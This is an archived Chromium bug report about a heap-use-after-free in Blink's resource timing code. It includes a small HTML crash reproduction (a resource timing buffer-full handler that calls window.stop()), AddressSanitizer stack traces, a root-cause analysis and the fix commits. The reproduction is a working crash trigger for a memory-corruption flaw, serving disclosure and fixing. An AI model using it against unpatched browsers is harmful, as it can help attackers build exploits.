# Heap-use-after-free in WTF::KeyValuePair<WebCore::Resource*, WTF::RefPtr<WebCore::ResourceTimingInfo> >::~KeyValuePair

| Field | Value |
|-------|-------|
| **Issue ID** | [40078063](https://issues.chromium.org/issues/40078063) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | li...@gmail.com |
| **Assignee** | ch...@samsung.com |
| **Created** | 2013-09-06 |
| **Bounty** | $1,000.00 |

## Description

Heap-use-after-free in ResourceLoader.

Please note that following test case was only working on trunk 221367.  

I've observed many uafs with the similar crash call-stacks on stable and beta, but I don't have simplified test cases for that.  

So I hope this test-case would be enough to confirm.  

Otherwise, I will work on the testcases for stable and beta as well.

**VERSION**  

Chrome Version: [29.0.1547.65] + [stable], [29.0.1547.57] + [beta], trunk 221367  

Operating System: [Debian 7.1]

**REPRODUCTION CASE**

<html>
<head>
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.7/angular.min.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/chrome-frame/1.0.3/CFInstall.min.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/dojo/1.9.1/dojo/dojo.js"></script>
<script>
performance.onwebkitresourcetimingbufferfull = function() {window.stop()};
performance.webkitSetResourceTimingBufferSize(3);
</script>
</head>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

==7538==ERROR: AddressSanitizer: heap-use-after-free on address 0x606000049128 at pc 0x7f35794f256d bp 0x7ffffcabe440 sp 0x7ffffcabe438  

READ of size 8 at 0x606000049128 thread T0 (chrome)  

#0 0x7f35794f256c in ~RefPtr /third\_party/WebKit/Source/wtf/RefPtr.h:50  

#1 0x7f35794f223d in deleteBucket /third\_party/WebKit/Source/wtf/HashTable.h:345  

#2 0x7f35794f21b0 in remove /third\_party/WebKit/Source/wtf/HashTable.h:825  

#3 0x7f35794f20b8 in remove /third\_party/WebKit/Source/wtf/HashTable.h:839  

#4 0x7f35794eaa16 in didLoadResource /third\_party/WebKit/Source/core/fetch/ResourceFetcher.cpp:938  

#5 0x7f35794f9018 in releaseResources /third\_party/WebKit/Source/core/fetch/ResourceLoader.cpp:91  

#6 0x7f35794faab7 in didFinishLoading /third\_party/WebKit/Source/core/fetch/ResourceLoader.cpp:359  

#7 0x7f3577e23443 in OnCompletedRequest /webkit/child/weburlloader\_impl.cc:726  

#8 0x7f3577d94ed6 in OnRequestComplete /content/child/resource\_dispatcher.cc:547  

#9 0x7f3577d96b1a in Dispatch<content::ResourceDispatcher, content::ResourceDispatcher, void (content::ResourceDispatcher::\*)(int, int, bool, const std::basic\_string<char> &, const base::TimeTicks &)> /content/common/resource\_messages.h:264  

#10 0x7f3577d92a57 in DispatchMessage /content/child/resource\_dispatcher.cc:658  

#11 0x7f3577d91dc8 in OnMessageReceived /content/child/resource\_dispatcher.cc:313  

#12 0x7f3577cd516d in OnMessageReceived /content/child/child\_thread.cc:314  

#13 0x7f35733b7fac in OnDispatchMessage /ipc/ipc\_channel\_proxy.cc:264  

#14 0x7f35733bfd24 in MakeItSo /base/bind\_internal.h:898  

#15 0x7f35763ffb04 in RunTask /base/message\_loop/message\_loop.cc:486  

#16 0x7f357640046b in DeferOrRunPendingTask /base/message\_loop/message\_loop.cc:498  

#17 0x7f35764006d1 in DoWork /base/message\_loop/message\_loop.cc:612  

#18 0x7f357640d58d in Run /base/message\_loop/message\_pump\_default.cc:32  

#19 0x7f35763ff13b in RunInternal /base/message\_loop/message\_loop.cc:436  

#20 0x7f357644bb09 in Run /base/run\_loop.cc:45  

#21 0x7f35763fde9d in Run /base/message\_loop/message\_loop.cc:307  

#22 0x7f3575690b47 in RendererMain /content/renderer/renderer\_main.cc:252  

#23 0x7f357469cea6 in RunZygote /content/app/content\_main\_runner.cc:397  

#24 0x7f357469d828 in RunNamedProcessTypeMain /content/app/content\_main\_runner.cc:466  

#25 0x7f357469e724 in Run /content/app/content\_main\_runner.cc:778  

#26 0x7f357469c562 in ContentMain /content/app/content\_main.cc:35  

#27 0x7f3571f0eac6 in ChromeMain /chrome/app/chrome\_main.cc:39  

#28 0x7f3571f0ea0a in main /chrome/app/chrome\_exe\_main\_gtk.cc:43  

#29 0x7f3568611994 in ?? ??:0  

#30 0x7f3571f0e92c in \_start ??:0  

0x606000049128 is located 40 bytes inside of 64-byte region [0x606000049100,0x606000049140)  

freed by thread T0 (chrome) here:  

#0 0x7f3571efb704 in \_*interceptor\_free *asan\_rtl*  

#1 0x7f35794f20b8 in remove /third\_party/WebKit/Source/wtf/HashTable.h:839  

#2 0x7f35794eaa16 in didLoadResource /third\_party/WebKit/Source/core/fetch/ResourceFetcher.cpp:938  

#3 0x7f35794f9018 in releaseResources /third\_party/WebKit/Source/core/fetch/ResourceLoader.cpp:91  

#4 0x7f35794f9a0a in cancel /third\_party/WebKit/Source/core/fetch/ResourceLoader.cpp:211  

#5 0x7f35794f9905 in cancel /third\_party/WebKit/Source/core/fetch/ResourceLoader.cpp:202  

addr2line: '': No such file  

#6 0x7f35794fbdd2 in cancelAll /third\_party/WebKit/Source/core/fetch/ResourceLoaderSet.cpp:44  

#7 0x7f3579688504 in stopLoading /third\_party/WebKit/Source/core/loader/DocumentLoader.cpp:246  

#8 0x7f35796a062b in stopAllLoaders /third\_party/WebKit/Source/core/loader/FrameLoader.cpp:849  

#9 0x7f3578a7a29c in stopMethodCallback /b/build/slave/ASAN\_Release\_\_symbolized*/build/src/out/Release/gen/blink/bindings/V8Window.cpp:5951  

#10 0x7f357612df3f in Call /v8/src/arguments.cc:56  

#11 0x7f3575bed578 in HandleApiCallHelper<false> /v8/src/builtins.cc:1272  

#12 0x7f3575be0724 in Builtin\_HandleApiCall /v8/src/builtins.cc:1288  

#13 0x29a2db6072ad in  

#14 0x29a2db6ea5f3 in  

#15 0x29a2db6105f3 in  

#16 0x29a2db62e73d in  

#17 0x29a2db619696 in  

#18 0x7f3575c5f882 in Invoke /v8/src/execution.cc:119  

#19 0x7f3575ba3a28 in Call /v8/src/api.cc:4235  

#20 0x7f3578cc47b2 in callFunction /third\_party/WebKit/Source/bindings/v8/V8ScriptRunner.cpp:131  

#21 0x7f3578c6bf7a in callFunctionWithInstrumentation /third\_party/WebKit/Source/bindings/v8/ScriptController.cpp:203  

#22 0x7f3578c6bdac in callFunction /third\_party/WebKit/Source/bindings/v8/ScriptController.cpp:159  

#23 0x7f3578ca5e54 in callListenerFunction /third\_party/WebKit/Source/bindings/v8/V8EventListener.cpp:92  

#24 0x7f3578eabf44 in invokeEventHandler /third\_party/WebKit/Source/bindings/v8/V8AbstractEventListener.cpp:134  

#25 0x7f3578eabce0 in handleEvent /third\_party/WebKit/Source/bindings/v8/V8AbstractEventListener.cpp:94  

#26 0x7f3578629d50 in fireEventListeners /third\_party/WebKit/Source/core/dom/EventTarget.cpp:319  

#27 0x7f35786294b5 in fireEventListeners /third\_party/WebKit/Source/core/dom/EventTarget.cpp:268  

#28 0x7f3578629305 in dispatchEvent /third\_party/WebKit/Source/core/dom/EventTarget.cpp:176  

#29 0x7f357978c1c9 in addResourceTimingBuffer /third\_party/WebKit/Source/core/page/Performance.cpp:243  

previously allocated by thread T0 (chrome) here:  

#0 0x7f3571efb844 in \_\_interceptor\_malloc *asan\_rtl*  

#1 0x7f357661ce9e in fastZeroedMalloc /third\_party/WebKit/Source/wtf/FastMalloc.cpp:191  

#2 0x7f35794f238d in rehash /third\_party/WebKit/Source/wtf/HashTable.h:916  

#3 0x7f35794f20b8 in remove /third\_party/WebKit/Source/wtf/HashTable.h:839  

#4 0x7f35794eaa16 in didLoadResource /third\_party/WebKit/Source/core/fetch/ResourceFetcher.cpp:938  

#5 0x7f35794f9018 in releaseResources /third\_party/WebKit/Source/core/fetch/ResourceLoader.cpp:91  

#6 0x7f35794faab7 in didFinishLoading /third\_party/WebKit/Source/core/fetch/ResourceLoader.cpp:359  

#7 0x7f3577e23443 in OnCompletedRequest /webkit/child/weburlloader\_impl.cc:726  

#8 0x7f3577d94ed6 in OnRequestComplete /content/child/resource\_dispatcher.cc:547  

#9 0x7f3577d96b1a in Dispatch<content::ResourceDispatcher, content::ResourceDispatcher, void (content::ResourceDispatcher::\*)(int, int, bool, const std::basic\_string<char> &, const base::TimeTicks &)> /content/common/resource\_messages.h:264  

#10 0x7f3577d92a57 in DispatchMessage /content/child/resource\_dispatcher.cc:658  

#11 0x7f3577d91dc8 in OnMessageReceived /content/child/resource\_dispatcher.cc:313  

#12 0x7f3577cd516d in OnMessageReceived /content/child/child\_thread.cc:314  

#13 0x7f35733b7fac in OnDispatchMessage /ipc/ipc\_channel\_proxy.cc:264  

#14 0x7f35733bfd24 in MakeItSo /base/bind\_internal.h:898  

#15 0x7f35763ffb04 in RunTask /base/message\_loop/message\_loop.cc:486  

#16 0x7f357640046b in DeferOrRunPendingTask /base/message\_loop/message\_loop.cc:498  

#17 0x7f35764006d1 in DoWork /base/message\_loop/message\_loop.cc:612  

#18 0x7f357640d58d in Run /base/message\_loop/message\_pump\_default.cc:32  

#19 0x7f35763ff13b in RunInternal /base/message\_loop/message\_loop.cc:436  

#20 0x7f357644bb09 in Run /base/run\_loop.cc:45  

#21 0x7f35763fde9d in Run /base/message\_loop/message\_loop.cc:307  

#22 0x7f3575690b47 in RendererMain /content/renderer/renderer\_main.cc:252  

#23 0x7f357469cea6 in RunZygote /content/app/content\_main\_runner.cc:397  

#24 0x7f357469d828 in RunNamedProcessTypeMain /content/app/content\_main\_runner.cc:466  

#25 0x7f357469e724 in Run /content/app/content\_main\_runner.cc:778  

#26 0x7f357469c562 in ContentMain /content/app/content\_main.cc:35  

#27 0x7f3571f0eac6 in ChromeMain /chrome/app/chrome\_main.cc:39  

#28 0x7f3571f0ea0a in main /chrome/app/chrome\_exe\_main\_gtk.cc:43  

#29 0x7f3568611994 in ?? ??:0  

Shadow bytes around the buggy address:  

0x0c0c800011d0: 00 00 00 01 fa fa fa fa 00 00 00 00 00 00 00 fa  

0x0c0c800011e0: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa  

0x0c0c800011f0: fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd  

0x0c0c80001200: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fa  

0x0c0c80001210: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa  

=>0x0c0c80001220: fd fd fd fd fd[fd]fd fd fa fa fa fa fd fd fd fd  

0x0c0c80001230: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c0c80001240: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa  

0x0c0c80001250: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd  

0x0c0c80001260: fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c0c80001270: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

ASan internal: fe  

==7538==ABORTING

This is the asan dump from stable 29.0.1547.65

==ERROR: AddressSanitizer: heap-use-after-free on address 0x61500006e1e8 at pc 0x7f9f46312e26 bp 0x7fffc160fa40 sp 0x7fffc160fa38  

READ of size 8 at 0x61500006e1e8 thread T0 (chrome)  

#0 0x7f9f46312e25 in deleteBucket /third\_party/WebKit/Source/wtf/RefPtr.h:51  

#1 0x7f9f4630cc6b in removeAndInvalidateWithoutEntryConsistencyCheck /third\_party/WebKit/Source/wtf/HashTable.h:1008  

#2 0x7f9f462c5145 in releaseResources /third\_party/WebKit/Source/core/loader/ResourceLoader.cpp:91  

#3 0x7f9f462c876e in didFinishLoading /third\_party/WebKit/Source/core/loader/ResourceLoader.cpp:389  

#4 0x7f9f4aba1d54 in OnCompletedRequest /webkit/glue/weburlloader\_impl.cc:729  

#5 0x7f9f4b46e007 in OnRequestComplete /content/child/resource\_dispatcher.cc:514  

#6 0x7f9f4b46a5fd in DispatchToMethod<content::ResourceDispatcher, void (content::ResourceDispatcher::\*)(int, int, bool, const std::basic\_string<char> &, const base::TimeTicks &), int, int, bool, std::basic\_string<char>, base::TimeTicks> /base/tuple.h:571  

#7 0x7f9f4b468b46 in OnMessageReceived /content/child/resource\_dispatcher.cc:306  

....  

0x61500006e1e8 is located 360 bytes inside of 512-byte region [0x61500006e080,0x61500006e280)  

freed by thread T0 (chrome) here:  

#0 0x7f9f423b59a1 in \_\_interceptor\_free *asan\_rtl*  

#1 0x7f9f4630cc6b in removeAndInvalidateWithoutEntryConsistencyCheck /third\_party/WebKit/Source/wtf/HashTable.h:1008  

#2 0x7f9f462c5145 in releaseResources /third\_party/WebKit/Source/core/loader/ResourceLoader.cpp:91  

#3 0x7f9f462c5f7f in cancel /third\_party/WebKit/Source/core/loader/ResourceLoader.cpp:225  

#4 0x7f9f462c577f in cancel /third\_party/WebKit/Source/core/loader/ResourceLoader.cpp:216  

#5 0x7f9f4625d8ba in cancelAll /third\_party/WebKit/Source/core/loader/DocumentLoader.cpp:78  

#6 0x7f9f4625d3c8 in stopLoadingSubresources /third\_party/WebKit/Source/core/loader/DocumentLoader.cpp:900

previously allocated by thread T0 (chrome) here:  

#0 0x7f9f423b5ae1 in \_\_interceptor\_malloc *asan\_rtl*  

#1 0x7f9f46312ee9 in allocateTable /third\_party/WebKit/Source/wtf/HashTable.h:1079  

#2 0x7f9f46313e2f in expand /third\_party/WebKit/Source/wtf/HashTable.h:1108  

#3 0x7f9f4630bb0d in inlineAdd /third\_party/WebKit/Source/wtf/HashMap.h:342  

#4 0x7f9f46309cd3 in loadResource /third\_party/WebKit/Source/core/loader/cache/CachedResourceLoader.cpp:678  

#5 0x7f9f463069a8 in requestResource /third\_party/WebKit/Source/core/loader/cache/CachedResourceLoader.cpp:453

## Attachments

- [stable_29.0.1547.65.txt](attachments/stable_29.0.1547.65.txt) (text/plain; charset=us-ascii, 7.9 KB)

## Timeline

### cl...@chromium.org (2013-09-06)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=4843808617398272

### in...@chromium.org (2013-09-06)

As per CF, this is a m31 regression. I am pretty sure it is 
155875 10.08.2013 00:02:57, by ch.dumez@sisa.samsung.com
Have the Performance interface inherit EventTarget

lifeasageek@, can you paste some crash stacks for stable, beta releases. I don't understand how this can affect m29 and m30.

### in...@chromium.org (2013-09-06)

Once CF confirms the regression range, i will revert the changeset. (unless dev responds and has a quick fix in mind).

### li...@gmail.com (2013-09-06)

Sure, this is beta 29.0.1547.57

==ERROR: AddressSanitizer: heap-use-after-free on address 0x6150000a5928 at pc 0x7fd2b8d69486 bp 0x7fff792050c0 sp 0x7fff792050b8
READ of size 8 at 0x6150000a5928 thread T0 (chrome)
    #0 0x7fd2b8d69485 in deleteBucket /third_party/WebKit/Source/wtf/RefPtr.h:51
    #1 0x7fd2b8d632cb in removeAndInvalidateWithoutEntryConsistencyCheck /third_party/WebKit/Source/wtf/HashTable.h:1008
    #2 0x7fd2b8d1b7a5 in releaseResources /third_party/WebKit/Source/core/loader/ResourceLoader.cpp:91
    #3 0x7fd2b8d1edce in didFinishLoading /third_party/WebKit/Source/core/loader/ResourceLoader.cpp:389
    #4 0x7fd2bd5f2cf4 in OnCompletedRequest /webkit/glue/weburlloader_impl.cc:729
    #5 0x7fd2bdebf017 in OnRequestComplete /content/child/resource_dispatcher.cc:514
    #6 0x7fd2bdebb60d in DispatchToMethod<content::ResourceDispatcher, void (content::ResourceDispatcher::*)(int, int, bool, const std::basic_string<char> &, const base::TimeTicks &), int, int, bool, std::basic_string<char>, base::TimeTicks> /base/tuple.h:571
    #7 0x7fd2bdeb9b56 in OnMessageReceived /content/child/resource_dispatcher.cc:306
    #8 0x7fd2bde5298f in OnMessageReceived /content/child/child_thread.cc:241
    #9 0x7fd2b6048eb0 in OnDispatchMessage /ipc/ipc_channel_proxy.cc:261
    #10 0x7fd2bb6387c7 in Run /base/callback.h:396
    #11 0x7fd2bb638f54 in DeferOrRunPendingTask /base/message_loop/message_loop.cc:496
    #12 0x7fd2bb639ff0 in DoWork /base/message_loop/message_loop.cc:688
    #13 0x7fd2bb6412f1 in Run /base/message_loop/message_pump_default.cc:29
    #14 0x7fd2bb6375b9 in RunInternal /base/message_loop/message_loop.cc:441
    #15 0x7fd2bb67c8c3 in Run /base/run_loop.cc:45
    #16 0x7fd2bb635f0d in Run /base/message_loop/message_loop.cc:321
    #17 0x7fd2bc3b0762 in RendererMain /content/renderer/renderer_main.cc:236
    #18 0x7fd2bbcbf61e in RunZygote /content/app/content_main_runner.cc:385
    #19 0x7fd2bbcc0a88 in RunNamedProcessTypeMain /content/app/content_main_runner.cc:441
    #20 0x7fd2bbcc2250 in Run /content/app/content_main_runner.cc:754
    #21 0x7fd2bbcbed61 in ContentMain /content/app/content_main.cc:35
    #22 0x7fd2b4e1cf46 in ChromeMain /chrome/app/chrome_main.cc:32
    #23 0x7fd2b4e1ce8a in main /chrome/app/chrome_exe_main_gtk.cc:43
    #24 0x7fd2ab6bb994 in ?? ??:0
    #25 0x7fd2b4e1cdac in _start ??:0
0x6150000a5928 is located 296 bytes inside of 512-byte region [0x6150000a5800,0x6150000a5a00)
freed by thread T0 (chrome) here:
    #0 0x7fd2b4e0c8f1 in __interceptor_free _asan_rtl_
    #1 0x7fd2b8d632cb in removeAndInvalidateWithoutEntryConsistencyCheck /third_party/WebKit/Source/wtf/HashTable.h:1008
    #2 0x7fd2b8d1b7a5 in releaseResources /third_party/WebKit/Source/core/loader/ResourceLoader.cpp:91
    #3 0x7fd2b8d1c5df in cancel /third_party/WebKit/Source/core/loader/ResourceLoader.cpp:225
    #4 0x7fd2b8d1bddf in cancel /third_party/WebKit/Source/core/loader/ResourceLoader.cpp:216
    #5 0x7fd2b8cb3f1a in cancelAll /third_party/WebKit/Source/core/loader/DocumentLoader.cpp:78
    #6 0x7fd2b8cb3a28 in stopLoadingSubresources /third_party/WebKit/Source/core/loader/DocumentLoader.cpp:900
    #7 0x7fd2b8ce6b5e in stopAllLoaders /third_party/WebKit/Source/core/loader/FrameLoader.cpp:1211
    #8 0x7fd2b8ce6e2d in stopForUserCancel /third_party/WebKit/Source/core/loader/FrameLoader.cpp:1224
    #9 0x7fd2baa298c3 in Call /v8/src/arguments.cc:99
    #10 0x7fd2baa663ba in HandleApiCallHelper<false> /v8/src/builtins.cc:1276
    #11 0x15acfe90688d in
    #12 0x15acfe9b6216 in
    #13 0x15acfe90fdb3 in
    #14 0x15acfe975271 in
    #15 0x15acfe972624 in
    #16 0x15acfe96f2f7 in
    #17 0x15acfe95cb00 in
    #18 0x15acfe9867e1 in
    #19 0x15acfe90fdb3 in
    #20 0x15acfe92acbd in
    #21 0x15acfe907b56 in
    #22 0x7fd2bab05540 in Invoke /v8/src/execution.cc:119
    #23 0x7fd2baa0756f in Call /v8/src/api.cc:4213
    #24 0x7fd2b7e1741f in callFunction /third_party/WebKit/Source/bindings/v8/V8ScriptRunner.cpp:132
    #25 0x7fd2b7db7bb3 in callFunctionWithInstrumentation /third_party/WebKit/Source/bindings/v8/ScriptController.cpp:211
    #26 0x7fd2b7db73e4 in callFunction /third_party/WebKit/Source/bindings/v8/ScriptController.cpp:167
    #27 0x7fd2b7dfad30 in callListenerFunction /third_party/WebKit/Source/bindings/v8/V8EventListener.cpp:91
    #28 0x7fd2b801430c in invokeEventHandler /third_party/WebKit/Source/bindings/v8/V8AbstractEventListener.cpp:133
    #29 0x7fd2b8013e09 in handleEvent /third_party/WebKit/Source/bindings/v8/V8AbstractEventListener.cpp:93
previously allocated by thread T0 (chrome) here:
    #0 0x7fd2b4e0ca31 in __interceptor_malloc _asan_rtl_
    #1 0x7fd2b8d69549 in allocateTable /third_party/WebKit/Source/wtf/HashTable.h:1079
    #2 0x7fd2b8d6a48f in expand /third_party/WebKit/Source/wtf/HashTable.h:1108
    #3 0x7fd2b8d6216d in inlineAdd /third_party/WebKit/Source/wtf/HashMap.h:342
    #4 0x7fd2b8d60333 in loadResource /third_party/WebKit/Source/core/loader/cache/CachedResourceLoader.cpp:678
    #5 0x7fd2b8d5d008 in requestResource /third_party/WebKit/Source/core/loader/cache/CachedResourceLoader.cpp:453
    #6 0x7fd2b8d646bb in requestPreload /third_party/WebKit/Source/core/loader/cache/CachedResourceLoader.cpp:996
    #7 0x7fd2be026dbf in preload /third_party/WebKit/Source/core/html/parser/HTMLResourcePreloader.cpp:92
    #8 0x7fd2be0268d0 in takeAndPreload /third_party/WebKit/Source/core/html/parser/HTMLResourcePreloader.cpp:73
    #9 0x7fd2be007f6f in didReceiveParsedChunkFromBackgroundParser /third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:299
    #10 0x7fd2be0d54bb in PassOwnPtr /third_party/WebKit/Source/wtf/Functional.h:210
    #11 0x7fd2bb8a11c1 in operator() /third_party/WebKit/Source/wtf/Functional.h:577
    #12 0x7fd2bb6387c7 in Run /base/callback.h:396
    #13 0x7fd2bb638f54 in DeferOrRunPendingTask /base/message_loop/message_loop.cc:496
    #14 0x7fd2bb639ff0 in DoWork /base/message_loop/message_loop.cc:688
    #15 0x7fd2bb6412f1 in Run /base/message_loop/message_pump_default.cc:29
    #16 0x7fd2bb6375b9 in RunInternal /base/message_loop/message_loop.cc:441
    #17 0x7fd2bb67c8c3 in Run /base/run_loop.cc:45
    #18 0x7fd2bb635f0d in Run /base/message_loop/message_loop.cc:321
    #19 0x7fd2bc3b0762 in RendererMain /content/renderer/renderer_main.cc:236
    #20 0x7fd2bbcbf61e in RunZygote /content/app/content_main_runner.cc:385
    #21 0x7fd2bbcc0a88 in RunNamedProcessTypeMain /content/app/content_main_runner.cc:441
    #22 0x7fd2bbcc2250 in Run /content/app/content_main_runner.cc:754
    #23 0x7fd2bbcbed61 in ContentMain /content/app/content_main.cc:35
    #24 0x7fd2b4e1cf46 in ChromeMain /chrome/app/chrome_main.cc:32
    #25 0x7fd2b4e1ce8a in main /chrome/app/chrome_exe_main_gtk.cc:43
    #26 0x7fd2ab6bb994 in ?? ??:0
Shadow bytes around the buggy address:
  0x0c2a8000cad0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2a8000cae0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2a8000caf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c2a8000cb00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2a8000cb10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c2a8000cb20: fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd
  0x0c2a8000cb30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2a8000cb40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c2a8000cb50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2a8000cb60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c2a8000cb70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:     fa
  Heap right redzone:    fb
  Freed heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==26824==ABORTING


### li...@gmail.com (2013-09-06)

Attached stable 29.0.1547.65, but seems almost the same to the beta one.

### li...@gmail.com (2013-09-06)

Oh, sorry. I don't have m30 asan chrome -:( (guess you may know the reason)

### in...@chromium.org (2013-09-07)

Regression from http://src.chromium.org/viewvc/blink?view=rev&revision=154675

### in...@chromium.org (2013-09-07)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-07)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6440269436157952

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x60c00009bd98
Crash State:
  - crash stack -
  WTF::KeyValuePair<WebCore::Resource*, WTF::RefPtr<WebCore::ResourceTimingInfo> >::~KeyValuePair
  WebCore::ResourceFetcher::didLoadResource
  - free stack -
  WebCore::ResourceFetcher::didLoadResource
  WebCore::ResourceLoader::releaseResources
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=213073:213078

Minimized Testcase (1.03 Kb): https://cluster-fuzz.appspot.com/download/AMIfv97OypNNSkejnNKlQ7a-NGSKGTDJNgTtT2AKRvpSg-jw1iroO250BjcyDNmF2Yypcu6NlqdyIUY77XDNv00gcJfXqp6SO5XW0HW8bt3bIIft3z7TSRl28KkviJwc8xMTspv9btM3bMCgkooanSU1ONQZ40z5rw

Additional requirements: Requires HTTP



### in...@chromium.org (2013-09-08)

[Empty comment from Monorail migration]

### [Deleted User] (2013-09-09)

The crash reason is dig out. 
Currently, ResourceTimingInfoMap in ResourceFetcher releases the aResourceTimingInfo after a resource is reported.
In this case, in ResourceFetcher::didLoadResource when blink is in reporting a resource entry, which lead to buffer full and immediately invokes the window.stop(), then dive into ResourceFetcher::didLoadResource again, and release the memory in a nested. After reporting the entry,the outer double free the memory.
I'm working on a patch, which releases the ResourceTimingInfo before reporting a resource timing entry, so there won't be a double free.

While in general, I think it is a problem that resource in "finish loading" status may cause it "finish loading" again.

### in...@chromium.org (2013-09-09)

[Empty comment from Monorail migration]

### [Deleted User] (2013-09-10)

@lifeasageek, do you mind patch your case as a layout test for blink? or I can help submit together with the fix https://codereview.chromium.org/23498018/

thanks
Pan

### bu...@chromium.org (2013-09-13)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=157760

------------------------------------------------------------------------
r157760 | pan.deng@chromium.org | 2013-09-13T17:04:53.955559Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/misc/stop-loading-on-resource-timing-buffer-full-crash-expected.txt?r1=157760&r2=157759&pathrev=157760
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/misc/stop-loading-on-resource-timing-buffer-full-crash.html?r1=157760&r2=157759&pathrev=157760
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/fetch/ResourceFetcher.cpp?r1=157760&r2=157759&pathrev=157760

[Resource Timing] Fix potential double free problem

  Currently, ResourceTimingInfoMap in ResourceFetcher releases a 
ResourceTimingInfo after a resource is reported.
  If when blink is in reporting a resource entry, which lead to buffer full and 
immediately invoke "window.stop()" as callback, it will dive into 
ResourceFetcher::didLoadResource again, and release the memory in a nested. 
After that,the outer double free the memory as it just report the entry.
  This patch remove ResourceTiming from map ealier and prevent the double free case.

Contributed by lifeasageek@gmail.com and pan.deng@intel.com

BUG=286414

Review URL: https://chromiumcodereview.appspot.com/23498018
------------------------------------------------------------------------

### in...@chromium.org (2013-09-13)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-14)

ClusterFuzz has detected this issue as fixed in range 223184:223206.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6440269436157952

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x60c00009bd98
Crash State:
  - crash stack -
  WTF::KeyValuePair<WebCore::Resource*, WTF::RefPtr<WebCore::ResourceTimingInfo> >::~KeyValuePair
  WebCore::ResourceFetcher::didLoadResource
  - free stack -
  WebCore::ResourceFetcher::didLoadResource
  WebCore::ResourceLoader::releaseResources
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=213073:213078
Fixed: https://cluster-fuzz.appspot.com/revisions?range=223184:223206

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97OypNNSkejnNKlQ7a-NGSKGTDJNgTtT2AKRvpSg-jw1iroO250BjcyDNmF2Yypcu6NlqdyIUY77XDNv00gcJfXqp6SO5XW0HW8bt3bIIft3z7TSRl28KkviJwc8xMTspv9btM3bMCgkooanSU1ONQZ40z5rw

Additional requirements: Requires HTTP

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### li...@gmail.com (2013-09-16)

Can I claim the credits for all the vulnerabilities I reported so far as "Byoungyoung Lee and Tielei Wang from GTISC" ?

### ka...@google.com (2013-09-16)

nate merged this. ty nate!

### in...@chromium.org (2013-09-16)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-09-16)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=157836

------------------------------------------------------------------------
r157836 | japhet@chromium.org | 2013-09-16T17:57:01.071734Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/1599/Source/core/loader/cache/ResourceFetcher.cpp?r1=157836&r2=157835&pathrev=157836

Merge "[Resource Timing] Fix potential double free problem"

  Currently, ResourceTimingInfoMap in ResourceFetcher releases a 
ResourceTimingInfo after a resource is reported.
  If when blink is in reporting a resource entry, which lead to buffer full and 
immediately invoke "window.stop()" as callback, it will dive into 
ResourceFetcher::didLoadResource again, and release the memory in a nested. 
After that,the outer double free the memory as it just report the entry.
  This patch remove ResourceTiming from map ealier and prevent the double free case.

Contributed by lifeasageek@gmail.com and pan.deng@intel.com

BUG=286414

Review URL: https://codereview.chromium.org/23651014
------------------------------------------------------------------------

### in...@chromium.org (2013-09-25)

